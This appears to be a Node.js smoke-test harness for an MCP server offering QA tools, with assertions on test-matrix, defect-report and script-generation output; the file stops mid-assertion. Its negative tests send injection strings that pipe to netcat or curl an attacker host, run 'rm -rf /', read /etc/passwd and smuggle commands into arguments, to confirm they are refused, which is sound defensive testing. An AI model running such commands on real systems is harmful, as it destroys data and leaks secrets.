#!/usr/bin/env node
/**
 * Smoke harness for the QA Expert Engine MCP server.
 *
 * Drives a real stdio JSON-RPC session against index.js and asserts both
 * success paths and negative safety rejections. Verifies the PRD's hard
 * invariants:
 *   - stdout carries protocol JSON only
 *   - no tool fault escapes as a JSON-RPC protocol error
 *   - command injection and workspace escape are refused, never executed
 */

import { spawn } from "node:child_process";
import { existsSync, rmSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = path.resolve(HERE, "..");
const SERVER = path.join(REPO_ROOT, "index.js");
const SENTINEL = path.join(REPO_ROOT, ".smoke-injection-sentinel");

/* ── Session driver ─────────────────────────────────────────────────────── */

function runSession(requests, { timeoutMs = 60_000 } = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [SERVER], {
      cwd: REPO_ROOT,
      stdio: ["pipe", "pipe", "pipe"],
    });

    let stdout = "";
    let stderr = "";
    const expected = requests.filter((r) => r.id !== undefined).length;

    const timer = setTimeout(() => {
      child.kill("SIGKILL");
      reject(new Error(`Session timed out after ${timeoutMs}ms`));
    }, timeoutMs);

    const finish = () => {
      clearTimeout(timer);
      if (!child.killed) child.kill();
      const lines = stdout.split("\n").filter((l) => l.trim().length > 0);
      resolve({ stdout, stderr, lines });
    };

    child.stdout.on("data", (chunk) => {
      stdout += chunk.toString();
      const complete = stdout.split("\n").filter((l) => l.trim().length > 0);
      if (complete.length >= expected) setTimeout(finish, 150);
    });
    child.stderr.on("data", (chunk) => {
      stderr += chunk.toString();
    });
    child.on("error", reject);
    child.on("close", finish);

    for (const req of requests) {
      child.stdin.write(JSON.stringify(req) + "\n");
    }
    child.stdin.end();
  });
}

/* ── Assertions ─────────────────────────────────────────────────────────── */

const results = [];
let currentGroup = "";

function group(name) {
  currentGroup = name;
}

function check(name, fn) {
  try {
    fn();
    results.push({ group: currentGroup, name, ok: true });
  } catch (error) {
    results.push({ group: currentGroup, name, ok: false, error: error.message });
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

function assertIncludes(haystack, needle, label) {
  assert(
    String(haystack).includes(needle),
    `${label}: expected output to contain "${needle}"`
  );
}

const text = (response) =>
  (response?.result?.content ?? []).map((c) => c.text ?? "").join("\n");

/* ── Request plan ───────────────────────────────────────────────────────── */

const SAMPLE_CODE = `
function createSubscription(planId, seatCount, trialDays, autoRenew) {
  // seatCount minimum 1, maximum 500
  // trialDays between 0 and 30
  if (seatCount > 500) throw new Error("too many seats");
  return { planId, seatCount, trialDays, autoRenew };
}
`;

const RICH_CODE = `
function updateSubscription(planTier, seatCount, autoRenew, status, failedAttempts) {
  // seatCount minimum 1, maximum 500
  // failedAttempts max 3
  // planTier one of: basic, pro, enterprise
  // status: 'active' | 'suspended' | 'cancelled'
}
`;

const ALT_CODE = `
interface ShippingAddress {
  postcode: string;
  countryCode: 'GB' | 'US' | 'DE';
  deliveryWindowDays: number;
}
`;

const NODE_TRACE = [
  "TypeError: Cannot read properties of undefined (reading 'rate')",
  "    at applyDiscount (/workspace/src/billing.js:42:19)",
  "    at processOrder (/workspace/src/orders.js:88:7)",
  "    at Object.<anonymous> (/workspace/node_modules/jest-runner/build/run.js:12:9)",
].join("\n");

const PY_TRACE = [
  "Traceback (most recent call last):",
  '  File "/workspace/app/checkout.py", line 73, in calculate_total',
  "    return subtotal / item_count",
  "ZeroDivisionError: division by zero",
].join("\n");

const UI_REQUIREMENTS = `# Billing Portal
- User logs in with email and password
- User views the billing dashboard
- User adds a new credit card and pays the outstanding invoice
- User downloads a PDF invoice
- User invites a teammate with admin permission
- User searches historical transactions`;

const FEATURE_SPEC = `# Checkout — Add Payment Method
- email (string, required, max 254)
- cardNumber (string, required, 16 digits)
- expiryMonth (number, between 1 and 12)
- saveForFuture (boolean, optional)

User enters card details, submits the form, and sees a confirmation.`;

const BROWSER_TRACE = [
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
  "Viewport: 1280x800  URL: https://staging.example.com/billing",
  "TypeError: Cannot read properties of undefined (reading 'rate')",
  "    at applyDiscount (/workspace/src/billing.js:42:19)",
].join("\n");

const API_SPEC = `# Orders API
POST /api/v1/orders
GET /api/v1/orders/{id}
DELETE /api/v1/orders/{id}

Body fields:
- customerId (string, required)
- quantity (number, between 1 and 99)
- currency (string, one of: GBP, USD, EUR)`;

const PROJECT_CONTEXT =
  "Multi-tenant SaaS billing dashboard for e-commerce merchants. React + Node microservices. " +
  "50k daily active users, peak 1200 rps. PCI DSS and GDPR in scope.";

// Regression fixtures for the 1.1.1 fixes.
const RANGE_SPEC = `function applyDiscount(code, cardNumber) {
  // code: 6-12 characters
  // cardNumber: 16 digits
}`;

// Parser shapes that returned zero parameters before 1.2.0.
const TS_GENERIC = `function fetchPage<T extends Record<string, unknown>>(url: string, limit?: number) {}`;
const ONE_LINE_CLASS = `class Cart { addItem(sku, quantity) {} }`;
const ONE_LINE_INTERFACE = `interface Order { id: string; items: Item[]; meta: Record<string, unknown>; }`;

const call = (id, name, args) => ({
  jsonrpc: "2.0",
  id,
  method: "tools/call",
  params: { name, arguments: args },
});

const requests = [
  {
    jsonrpc: "2.0",
    id: 1,
    method: "initialize",
    params: {
      protocolVersion: "2024-11-05",
      capabilities: {},
      clientInfo: { name: "smoke", version: "1.0.0" },
    },
  },
  { jsonrpc: "2.0", method: "notifications/initialized" },
  { jsonrpc: "2.0", id: 2, method: "tools/list", params: {} },

  // Success paths
  call(10, "generate_qa_matrix", { codeSnippet: SAMPLE_CODE }),
  call(11, "generate_qa_matrix", { codeSnippet: ALT_CODE }),
  call(20, "generate_qa_matrix", { codeSnippet: RICH_CODE }),
  call(12, "run_local_test_suite", { command: "node --version" }),
  call(13, "run_local_test_suite", { command: "node scripts/fixtures/failing-suite.mjs" }),
  call(14, "parse_error_logs", { rawLogs: NODE_TRACE }),
  call(15, "parse_error_logs", { rawLogs: PY_TRACE }),
  call(16, "parse_error_logs", { rawLogs: "something went wrong somewhere" }),
  call(17, "generate_automation_script", {
    framework: "playwright",
    flowDescription: "user logs in, visits the billing screen, adds a valid credit card",
  }),
  call(18, "generate_automation_script", {
    framework: "cypress",
    flowDescription: "user logs in then verifies the dashboard loads",
  }),
  call(19, "generate_automation_script", {
    framework: "jest",
    flowDescription: "user submits the signup form and sees a confirmation",
  }),

  call(60, "generate_ui_ux_checklist", { requirements: UI_REQUIREMENTS }),
  call(61, "generate_ui_ux_checklist", { requirements: UI_REQUIREMENTS, scope: "accessibility" }),
  call(62, "generate_ui_ux_checklist", {}),
  call(63, "generate_ui_ux_checklist", { requirements: UI_REQUIREMENTS, scope: "bogus" }),

  call(70, "generate_manual_test_plan", { featureSpec: FEATURE_SPEC }),
  call(71, "generate_manual_test_plan", { featureSpec: FEATURE_SPEC, depth: "smoke" }),
  call(72, "generate_manual_test_plan", { featureSpec: FEATURE_SPEC, depth: "exhaustive" }),
  call(73, "generate_manual_test_plan", {}),

  call(80, "generate_automation_script", {
    framework: "playwright",
    flowDescription: "user logs in, visits the billing screen, enters a credit card number, and verifies the confirmation",
  }),
  call(81, "generate_automation_script", {
    framework: "cypress",
    flowDescription: "user logs in, visits the billing screen, enters a credit card number, and verifies the confirmation",
  }),
  call(82, "generate_automation_script", {
    framework: "jest",
    flowDescription: "user logs in, visits the billing screen, enters a credit card number, and verifies the confirmation",
  }),
  call(83, "generate_automation_script", {
    framework: "playwright",
    flowDescription: "user logs in and verifies the dashboard",
    coverage: "functional",
  }),
  call(84, "generate_automation_script", {
    framework: "playwright",
    flowDescription: "user logs in",
    coverage: "bogus",
  }),

  call(90, "parse_error_logs", { rawLogs: BROWSER_TRACE }),
  call(91, "parse_error_logs", { rawLogs: BROWSER_TRACE, format: "jira" }),
  call(92, "parse_error_logs", { rawLogs: BROWSER_TRACE, format: "both" }),
  call(93, "parse_error_logs", { rawLogs: NODE_TRACE, format: "bogus" }),

  call(100, "generate_api_contract_tests", { apiSpec: API_SPEC }),
  call(101, "generate_api_contract_tests", { apiSpec: API_SPEC, framework: "pytest" }),
  call(102, "generate_api_contract_tests", { apiSpec: API_SPEC, framework: "playwright" }),
  call(103, "generate_api_contract_tests", { apiSpec: "prose with no endpoints whatsoever" }),
  call(104, "generate_api_contract_tests", {}),

  call(110, "generate_test_strategy", { projectContext: PROJECT_CONTEXT }),
  call(111, "generate_test_strategy", { projectContext: "internal hack-week prototype", riskProfile: "prototype" }),
  call(112, "generate_test_strategy", { projectContext: PROJECT_CONTEXT, riskProfile: "regulated" }),
  call(113, "generate_test_strategy", {}),

  call(120, "generate_qa_matrix", { codeSnippet: RANGE_SPEC }),
  call(121, "generate_automation_script", {
    framework: "playwright",
    flowDescription: "user enters a discount code and sees the reduced total",
    coverage: "functional",
  }),
  call(122, "generate_automation_script", {
    framework: "playwright",
    flowDescription: "user accepts the terms and conditions",
    coverage: "functional",
  }),

  call(130, "generate_qa_matrix", { codeSnippet: TS_GENERIC }),
  call(131, "generate_qa_matrix", { codeSnippet: ONE_LINE_CLASS }),
  call(132, "generate_qa_matrix", { codeSnippet: ONE_LINE_INTERFACE }),
  call(133, "run_local_test_suite", { command: "npm test rm.cmd" }),
  call(134, "run_local_test_suite", { command: "npm run sudo.exe" }),
  call(135, "run_local_test_suite", { command: "npm test %PATH%" }),
  call(136, "run_local_test_suite", { command: "npm test ^& calc" }),

  call(140, "generate_qa_matrix", { codeSnippet: "function applyPromoCode(code) {\n  // code: 6-12 characters\n}" }),
  call(141, "generate_qa_matrix", { codeSnippet: "function setNote(note) {}" }),

  // Negative: missing / malformed arguments
  call(30, "generate_qa_matrix", {}),
  call(31, "parse_error_logs", {}),
  call(32, "run_local_test_suite", {}),
  call(33, "generate_automation_script", { framework: "selenium", flowDescription: "x" }),
  call(34, "generate_qa_matrix", { codeSnippet: 12345 }),
  call(35, "nonexistent_tool", {}),

  // Negative: command injection
  call(40, "run_local_test_suite", { command: `node --version; touch ${SENTINEL}` }),
  call(41, "run_local_test_suite", { command: "npm test && rm -rf /" }),
  call(42, "run_local_test_suite", { command: "npm test | nc attacker.example 4444" }),
  call(43, "run_local_test_suite", { command: "npm test $(whoami)" }),
  call(44, "run_local_test_suite", { command: "rm -rf ." }),
  call(45, "run_local_test_suite", { command: "curl http://attacker.example/x" }),
  call(46, "run_local_test_suite", { command: "sudo npm test" }),

  // Negative: workspace escape
  call(50, "run_local_test_suite", { command: "npm test --config ../../etc/passwd" }),
  call(51, "run_local_test_suite", { command: "pytest /etc/passwd" }),
  call(52, "run_local_test_suite", { command: "npm test --reporter=../../../tmp/out" }),
];

/* ── Execution ──────────────────────────────────────────────────────────── */

if (existsSync(SENTINEL)) rmSync(SENTINEL);

const session = await runSession(requests);

const byId = new Map();
let parseFailure = null;
for (const line of session.lines) {
  try {
    const parsed = JSON.parse(line);
    if (parsed.id !== undefined) byId.set(parsed.id, parsed);
  } catch {
    parseFailure = line.slice(0, 200);
  }
}

const get = (id) => {
  const response = byId.get(id);
  if (!response) throw new Error(`No response received for request id ${id}`);
  return response;
};

const isToolError = (id) => get(id).result?.isError === true;
const isProtocolError = (id) => get(id).error !== undefined;

group("Protocol invariants");

check("stdout contains only parseable JSON-RPC lines", () => {
  assert(parseFailure === null, `Non-JSON line on stdout: ${parseFailure}`);
  assert(session.lines.length > 0, "Server produced no stdout");
});

check("boot diagnostics go to stderr, not stdout", () => {
  assertIncludes(session.stderr, "QA Expert MCP Server running", "stderr banner");
});

check("initialize handshake succeeds", () => {
  assert(get(1).result?.serverInfo?.name === "qa-expert-engine", "Bad serverInfo");
});

check("tools/list advertises every registered tool", () => {
  const names = (get(2).result?.tools ?? []).map((t) => t.name).sort();
  const expected = [
    "generate_api_contract_tests",
    "generate_automation_script",
    "generate_manual_test_plan",
    "generate_qa_matrix",
    "generate_test_strategy",
    "generate_ui_ux_checklist",
    "parse_error_logs",
    "run_local_test_suite",
  ];
  assert(
    JSON.stringify(names) === JSON.stringify(expected),
    `Expected ${expected.join(", ")} — got ${names.join(", ") || "(none)"}`
  );
});

check("every tool advertises a schema with required fields", () => {
  for (const tool of get(2).result.tools) {
    assert(tool.inputSchema?.type === "object", `${tool.name}: missing object schema`);
    assert(
      Array.isArray(tool.inputSchema.required) && tool.inputSchema.required.length > 0,
      `${tool.name}: no required fields declared`
    );
  }
});

group("Tool 1 — generate_qa_matrix");

check("derives parameters from a function signature", () => {
  const out = text(get(10));
  for (const param of ["planId", "seatCount", "trialDays", "autoRenew"]) {
    assertIncludes(out, param, "parameter inventory");
  }
});

check("emits a BVA-derived test case specification", () => {
  const out = text(get(10));
  assertIncludes(out, "BOUNDARY VALUE ANALYSIS", "BVA section");
  assert(/TC_[A-Z]+_001/.test(out), "No module-scoped test case id (expected TC_<MODULE>_001)");
});

check("every test case carries all nine standard attributes", () => {
  const out = text(get(10));
  for (const attribute of [
    "Technique",
    "Pre-conditions",
    "Test Steps",
    "Test Data",
    "Expected Result",
    "Actual Result",
    "Status:",
  ]) {
    assertIncludes(out, attribute, "test case attribute");
  }
  assert(/TC_[A-Z]+_\d{3}\s+\|\s+\w+\s+\|\s+Verify /.test(out), "Missing id | module | action-verb title header");
});

check("builds a decision table from finite-domain parameters", () => {
  const out = text(get(20));
  assertIncludes(out, "DECISION TABLE", "decision table section");
  assertIncludes(out, "Expected Action", "action column");
  assert(/\| R01 /.test(out), "No decision rules emitted");
  assertIncludes(out, "planTier", "condition dimension");
});

check("builds a state transition model with negative coverage", () => {
  const out = text(get(20));
  assertIncludes(out, "STATE TRANSITION TESTING", "state section");
  assertIncludes(out, "Detected states", "state list");
  assertIncludes(out, "ILLEGAL", "illegal transition guidance");
  assertIncludes(out, "Threshold transition — failedAttempts", "lockout counter");
  assert(!out.includes("Threshold transition — seatCount"), "seatCount wrongly treated as a lockout counter");
});

check("emits exploratory charters for the human tester", () => {
  const out = text(get(20));
  assertIncludes(out, "EXPLORATORY TEST CHARTERS", "charter section");
  assertIncludes(out, "EXP-01", "charter id");
  assertIncludes(out, "Heuristics", "charter heuristics");
  assertIncludes(out, "timebox", "charter timebox");
});

check("resolves parameter types without falling back to unknown", () => {
  const out = text(get(20));
  assertIncludes(out, "Unresolved types      : none", "type resolution");
});

check("honours declared numeric boundaries (max 500 -> 499/500/501)", () => {
  const out = text(get(10));
  for (const boundary of ["499", "500", "501"]) {
    assertIncludes(out, boundary, "seatCount boundary");
  }
});

check("emits Equivalence Partitioning buckets", () => {
  const out = text(get(10));
  assertIncludes(out, "EQUIVALENCE PARTITIONING BUCKETS", "EP section");
  assertIncludes(out, "[VALID]", "valid partition");
  assertIncludes(out, "[INVALID]", "invalid partition");
});

check("parses TypeScript interfaces and enum unions", () => {
  const out = text(get(11));
  assertIncludes(out, "postcode", "interface field");
  assertIncludes(out, "countryCode", "interface field");
  assertIncludes(out, "GB", "enum member");
});

check("output is input-dependent, not a static template", () => {
  const a = text(get(10));
  const b = text(get(11));
  assert(a !== b, "Identical output for different inputs — still a static stub");
  assert(!b.includes("seatCount"), "Output leaked parameters from a different input");
});

group("Tool 2 — run_local_test_suite");

check("executes an approved command and captures stdout", () => {
  const response = get(12);
  assert(response.result?.isError !== true, "Passing command reported as an error");
  assertIncludes(text(response), "PASSED", "status line");
  assertIncludes(text(response), "[Exit Code]      0", "exit code");
});

check("failing suite returns isError with the full captured log", () => {
  const out = text(get(13));
  assert(isToolError(13), "Non-zero exit must surface as isError:true");
  assert(!isProtocolError(13), "Non-zero exit must not become a protocol error");
  assertIncludes(out, "FAILED", "status");
  assertIncludes(out, "[Exit Code]      1", "exit code preserved");
  assertIncludes(out, "Tests: 1 failed", "stdout captured");
  assertIncludes(out, "Cannot read properties of undefined", "stderr captured");
});

check("extracts a runner summary line", () => {
  assertIncludes(text(get(13)), "Runner Summary", "summary");
});

group("Tool 3 — parse_error_logs");

check("produces a structured JSON defect record", () => {
  const defect = JSON.parse(text(get(14)));
  assert(defect.errorClass === "TypeError", `Expected TypeError, got ${defect.errorClass}`);
  assert(defect.defectId.startsWith("DEF-"), "Missing defect id");
  assert(Array.isArray(defect.stepsToReproduce) && defect.stepsToReproduce.length > 0, "No repro steps");
  assert(Array.isArray(defect.suggestedFixVectors) && defect.suggestedFixVectors.length > 0, "No fix vectors");
});

check("identifies impacted segments and skips dependency frames", () => {
  const defect = JSON.parse(text(get(14)));
  assert(defect.impactedSegments.length >= 2, "Stack frames not extracted");
  assert(
    defect.likelyOrigin.file.includes("billing.js"),
    `Wrong origin: ${defect.likelyOrigin.file}`
  );
  const nodeModulesFrame = defect.impactedSegments.find((s) => s.file.includes("node_modules"));
  assert(
    nodeModulesFrame && nodeModulesFrame.isApplicationCode === false,
    "node_modules frame not flagged as dependency code"
  );
});

check("handles Python tracebacks", () => {
  const defect = JSON.parse(text(get(15)));
  assert(defect.language === "python", `Expected python, got ${defect.language}`);
  assert(defect.errorClass === "ZeroDivisionError", `Got ${defect.errorClass}`);
  assert(defect.likelyOrigin.file.includes("checkout.py"), "Python frame not resolved");
});

check("degrades gracefully on unrecognised input", () => {
  const response = get(16);
  assert(!isProtocolError(16), "Unrecognised log must not throw");
  const defect = JSON.parse(text(response));
  assert(defect.confidence === "low", `Expected low confidence, got ${defect.confidence}`);
  assert(typeof defect.parserNote === "string", "Missing parser note on partial record");
});

check("defect ids are deterministic across calls", () => {
  const a = JSON.parse(text(get(14))).defectId;
  assert(/^DEF-[0-9A-F]{8}$/.test(a), `Malformed defect id: ${a}`);
});

group("Tool 4 — generate_automation_script");

check("emits a Playwright Page Object Model", () => {
  const out = text(get(17));
  assertIncludes(out, "@playwright/test", "import");
  assertIncludes(out, "export class", "page object class");
  assertIncludes(out, "test.describe", "spec block");
  assertIncludes(out, "getByTestId", "locator strategy");
});

check("emits a Cypress Page Object Model", () => {
  const out = text(get(18));
  assertIncludes(out, "cy.get", "cypress command");
  assertIncludes(out, "describe(", "spec block");
  assertIncludes(out, "data-testid", "selector strategy");
});

check("emits a Jest + Testing Library Page Object Model", () => {
  const out = text(get(19));
  assertIncludes(out, "@testing-library", "import");
  assertIncludes(out, "jest-environment jsdom", "environment directive");
  assertIncludes(out, "screen.getByTestId", "query");
});

check("derives flow steps from the description", () => {
  const out = text(get(17));
  assertIncludes(out, "Steps", "step count header");
  assert(/Step 1:/.test(out), "No per-step documentation emitted");
});

check("returns plain text, not JSON (PRD section 4)", () => {
  const out = text(get(17)).trim();
  assert(!out.startsWith("{"), "Tool 4 must return a plain-text script block");
});

group("Tool 3 — defect report completeness");

check("record carries every mandatory bug report field", () => {
  const defect = JSON.parse(text(get(90)));
  for (const field of [
    "title",
    "environment",
    "preConditions",
    "stepsToReproduce",
    "assertionDelta",
    "evidenceRequired",
    "component",
    "reproducibility",
    "status",
  ]) {
    assert(field in defect, `Missing mandatory field: ${field}`);
  }
});

check("extracts environment specs from the log text", () => {
  const defect = JSON.parse(text(get(90)));
  const env = defect.environment.detected;
  assert(/Chrome/.test(env.browser ?? ""), `Browser not detected: ${env.browser}`);
  assert(env.os === "macOS", `OS not detected: ${env.os}`);
  assert(env.viewport === "1280x800", `Viewport not detected: ${env.viewport}`);
  assert(/staging\.example\.com/.test(env.url ?? ""), "URL not detected");
});

check("names what is missing rather than silently omitting it", () => {
  const defect = JSON.parse(text(get(90)));
  assert(Array.isArray(defect.environment.missing), "No missing-field list");
  assert(
    typeof defect.environment.note === "string" && defect.environment.note.length > 0,
    "Missing environment fields were not disclosed"
  );
});

check("derives the component from the first application frame", () => {
  const defect = JSON.parse(text(get(90)));
  assert(defect.component === "Billing", `Expected Billing, got ${defect.component}`);
});

check("lists category-appropriate evidence", () => {
  const defect = JSON.parse(text(get(90)));
  assert(defect.evidenceRequired.length >= 4, "Too few evidence items");
  assertIncludes(defect.evidenceRequired.join(" "), "Screenshot", "visual evidence");
  assertIncludes(defect.evidenceRequired.join(" "), "stack trace", "trace evidence");
});

check("renders a Jira-ready report", () => {
  const out = text(get(91));
  assert(!out.trim().startsWith("{"), "jira format must not return JSON");
  assertIncludes(out, "h2. ", "Jira heading");
  assertIncludes(out, "h3. Steps to Reproduce", "repro section");
  assertIncludes(out, "h3. Environment", "environment section");
  assertIncludes(out, "|| Field || Value ||", "Jira table");
  assertIncludes(out, "{code}", "code block");
  assert(/^# /m.test(out), "No numbered Jira steps");
});

check("format=both returns the Jira report and the JSON record", () => {
  const out = text(get(92));
  assertIncludes(out, "h2. ", "Jira section");
  assertIncludes(out, "{code:json}", "embedded JSON record");
  assertIncludes(out, '"defectId"', "JSON payload");
});

check("invalid format enum is rejected", () => {
  assert(isToolError(93), "Expected isError:true");
  assertIncludes(text(get(93)), "jira", "allowed values");
});

group("Tool 4 — extended coverage");

check("emits a data-driven spec separating script from dataset", () => {
  const out = text(get(80));
  assertIncludes(out, "data-driven", "DDT file");
  assertIncludes(out, "const CASES", "externalised dataset");
  assert(/for \(const testCase of CASES\)|CASES.forEach|it.each/.test(out), "No dataset loop emitted");
});

check("emits responsive specs at the documented breakpoints", () => {
  const out = text(get(80));
  assertIncludes(out, "responsive", "responsive file");
  for (const width of ["375", "414", "768", "1280", "1440", "1920"]) {
    assertIncludes(out, width, "breakpoint");
  }
  assertIncludes(out, "setViewportSize", "viewport control");
});

check("emits cross-browser projects covering all three engines", () => {
  const out = text(get(80));
  assertIncludes(out, "chromium", "Blink project");
  assertIncludes(out, "webkit", "WebKit project");
  assertIncludes(out, "firefox", "Gecko project");
});

check("emits visual regression assertions with masking and settled animation", () => {
  const out = text(get(80));
  assertIncludes(out, "toHaveScreenshot", "VRT assertion");
  assertIncludes(out, 'animations: "disabled"', "animation settling");
  assertIncludes(out, "mask:", "dynamic region masking");
});

check("emits component state specs", () => {
  const out = text(get(80));
  assertIncludes(out, "component states", "states file");
  for (const state of ["hover", "focus", "disabled", "loading"]) {
    assertIncludes(out.toLowerCase(), state, "UI state");
  }
  assertIncludes(out, "double submission", "double-submit lock");
});

check("emits accessibility specs wired to axe", () => {
  const out = text(get(80));
  assertIncludes(out, "@axe-core/playwright", "axe integration");
  assertIncludes(out, "wcag2aa", "WCAG tags");
});

check("emits a BDD feature file in Given/When/Then form", () => {
  const out = text(get(80));
  assertIncludes(out, ".feature", "feature file");
  assertIncludes(out, "Feature:", "Gherkin feature");
  assertIncludes(out, "Scenario:", "Gherkin scenario");
  assertIncludes(out, "Given ", "Given step");
  assertIncludes(out, "Then ", "Then step");
  assertIncludes(out, "Examples:", "scenario outline");
});

check("cypress and jest receive framework-correct extended artifacts", () => {
  const cypress = text(get(81));
  assertIncludes(cypress, "cy.viewport", "cypress viewport");
  assertIncludes(cypress, "cy.checkA11y", "cypress-axe");
  assertIncludes(cypress, "matchImageSnapshot", "cypress VRT");

  const jest = text(get(82));
  assertIncludes(jest, "jest-axe", "jest a11y");
  assertIncludes(jest, "it.each", "jest data-driven");
  assertIncludes(jest, "no layout engine", "honest jsdom VRT limitation");
});

check("no generated script uses a fixed sleep", () => {
  for (const id of [80, 81, 82]) {
    const out = text(get(id));
    assert(
      !/sleep\(|waitForTimeout\(|cy\.wait\(\d/.test(out),
      `Framework ${id} emitted a hardcoded wait`
    );
  }
});

check("coverage=functional narrows output and discloses what was omitted", () => {
  const out = text(get(83));
  assert(!out.includes("a11y"), "functional coverage should omit the a11y spec");
  assert(!out.includes("Feature:"), "functional coverage should omit the BDD file");
  assertIncludes(out, 'coverage "full" additionally emits', "omission disclosed");
});

check("invalid coverage enum is rejected", () => {
  assert(isToolError(84), "Expected isError:true");
  assertIncludes(text(get(84)), "functional", "allowed values");
});

group("Tool 5 — generate_ui_ux_checklist");

check("emits the responsive viewport matrix at documented breakpoints", () => {
  const out = text(get(60));
  assertIncludes(out, "RESPONSIVE VIEWPORT MATRIX", "viewport section");
  for (const width of ["375px", "414px", "768px", "1280px", "1440px", "1920px"]) {
    assertIncludes(out, width, "documented breakpoint");
  }
});

check("emits the cross-browser rendering engine matrix", () => {
  const out = text(get(60));
  assertIncludes(out, "CROSS-BROWSER", "engine section");
  for (const engine of ["Blink", "WebKit", "Gecko"]) {
    assertIncludes(out, engine, "rendering engine");
  }
});

check("emits visual regression targets", () => {
  const out = text(get(60));
  assertIncludes(out, "VISUAL REGRESSION TARGETS", "VRT section");
  assertIncludes(out, "VRT-01", "VRT target id");
  assertIncludes(out, "masked", "dynamic region guidance");
});

check("emits interactive component states", () => {
  const out = text(get(60));
  assertIncludes(out, "INTERACTIVE COMPONENT STATES", "states section");
  for (const state of ["Hover", "Focus", "Disabled", "Loading", "Empty", "Error"]) {
    assertIncludes(out, state, "UI state");
  }
});

check("emits WCAG 2.1 AA criteria", () => {
  const out = text(get(60));
  assertIncludes(out, "WCAG 2.1 AA", "a11y section");
  assertIncludes(out, "1.4.3 Contrast", "contrast criterion");
  assertIncludes(out, "2.1.1 Keyboard", "keyboard criterion");
});

check("emits UX usability metrics and observation protocol", () => {
  const out = text(get(60));
  for (const metric of ["Task Success Rate", "Time on Task", "Error Rate", "Rage Clicks"]) {
    assertIncludes(out, metric, "UX metric");
  }
  assertIncludes(out, "Thinking Aloud", "observation protocol");
});

check("ranks the highest-risk flows with a money-write flow first", () => {
  const out = text(get(60));
  assertIncludes(out, "HIGHEST-RISK FLOWS", "risk section");
  const first = out.split("\n").find((l) => l.startsWith("RISK-01"));
  assert(first, "No ranked flows emitted");
  assert(
    /credit card|pays/.test(first),
    `Expected the payment flow ranked first, got: ${first}`
  );
});

check("scope filter narrows the emitted sections", () => {
  const out = text(get(61));
  assertIncludes(out, "WCAG 2.1 AA", "a11y retained");
  assert(!out.includes("RESPONSIVE VIEWPORT MATRIX"), "scope filter did not drop the responsive section");
});

check("missing requirements returns isError", () => {
  assert(!isProtocolError(62), "Must not be a protocol error");
  assert(isToolError(62), "Expected isError:true");
});

check("invalid scope enum is rejected with the allowed list", () => {
  assert(isToolError(63), "Expected isError:true");
  assertIncludes(text(get(63)), "accessibility", "allowed values");
});

group("Tool 6 — generate_manual_test_plan");

check("emits the full manual execution workflow", () => {
  const out = text(get(70));
  for (const phase of [
    "PHASE A: ENVIRONMENT & STATE SETUP",
    "PHASE B1: HAPPY PATH VALIDATION",
    "PHASE B2: NEGATIVE PATH VALIDATION",
    "PHASE B3: BOUNDARY EXPLORATION",
    "PHASE B4: CONTEXTUAL EDGE CASES",
    "PHASE C: DEFECT REPORT TEMPLATE",
  ]) {
    assertIncludes(out, phase, "workflow phase");
  }
});

check("defect template carries all six mandatory fields", () => {
  const out = text(get(70));
  for (const field of [
    "Summary",
    "Environment",
    "Pre-conditions",
    "Steps to Repro",
    "Expected Result",
    "Actual Result",
    "Evidence",
  ]) {
    assertIncludes(out, field, "defect report field");
  }
  assertIncludes(out, "Screen recording", "evidence types");
  assertIncludes(out, "Screen resolution", "environment specs");
});

check("names the real module rather than a placeholder", () => {
  const out = text(get(70));
  assert(
    !/Component\/Module : Component\s*$/m.test(out),
    "Module label fell back to the generic placeholder"
  );
  assertIncludes(out, "Checkout", "feature-derived module label");
});

check("derives boundary checks from declared field constraints", () => {
  const out = text(get(70));
  assertIncludes(out, "enter 254 — expect acceptance; enter 255 — expect rejection", "maxLength boundary");
  assertIncludes(out, "enter 12 — expect acceptance; enter 13 — expect rejection", "numeric range boundary");
});

check("gives booleans a type-appropriate check, not a limit probe", () => {
  const out = text(get(70));
  assertIncludes(out, "saveForFuture: toggle both states", "boolean check");
  assert(
    !out.includes("saveForFuture: no documented limit"),
    "Boolean field wrongly given a numeric limit probe"
  );
});

check("emits exploratory charters and STLC exit criteria", () => {
  const out = text(get(70));
  assertIncludes(out, "EXPLORATORY SESSION CHARTERS", "charters");
  assertIncludes(out, "EXIT CRITERIA", "exit criteria");
  assertIncludes(out, "Defect density", "closure metrics");
  assertIncludes(out, "Defect clustering", "closure metrics");
});

check("depth smoke omits the deeper passes and says so", () => {
  const out = text(get(71));
  assertIncludes(out, "PHASE B1", "happy path retained");
  assert(!out.includes("PHASE B2"), "smoke depth should omit the negative pass");
  assertIncludes(out, 'depth "smoke" omits', "explicit omission notice");
});

check("depth exhaustive includes every contextual edge case", () => {
  const standard = text(get(70));
  const exhaustive = text(get(72));
  assertIncludes(standard, "further edge cases omitted", "truncation disclosed at standard depth");
  assert(
    !exhaustive.includes("further edge cases omitted"),
    "exhaustive depth should not omit edge cases"
  );
  assertIncludes(exhaustive, "keyboard only", "full edge case set");
});

check("missing featureSpec returns isError", () => {
  assert(!isProtocolError(73), "Must not be a protocol error");
  assert(isToolError(73), "Expected isError:true");
});

group("Tool 7 — generate_api_contract_tests");

check("parses REST endpoints from the specification", () => {
  const out = text(get(100));
  for (const endpoint of ["POST /api/v1/orders", "GET /api/v1/orders/{id}", "DELETE /api/v1/orders/{id}"]) {
    assertIncludes(out, endpoint, "detected endpoint");
  }
});

check("emits the status-code contract appropriate to each verb", () => {
  const out = get(100).result.content[0].text;
  for (const code of ["201", "400", "401", "403", "409", "422"]) {
    assert(new RegExp(`"${code} — `).test(out), `Missing POST status contract ${code}`);
  }
  assertIncludes(out, '"204 — ', "DELETE success contract");
});

check("derives a valid payload from declared fields", () => {
  const out = text(get(100));
  assertIncludes(out, "VALID_PAYLOAD", "payload constant");
  assertIncludes(out, "customerId", "string field");
  assertIncludes(out, "quantity", "numeric field");
  assertIncludes(out, '"GBP"', "enum field first member");
});

check("generates a missing-required-field case per field", () => {
  const out = text(get(100));
  assertIncludes(out, "rejects a payload missing customerId", "field omission case");
  assertIncludes(out, "rejects a payload missing quantity", "field omission case");
});

check("asserts schema, content type, and error envelope hygiene", () => {
  const out = text(get(100));
  assertIncludes(out, "application", "content-type assertion");
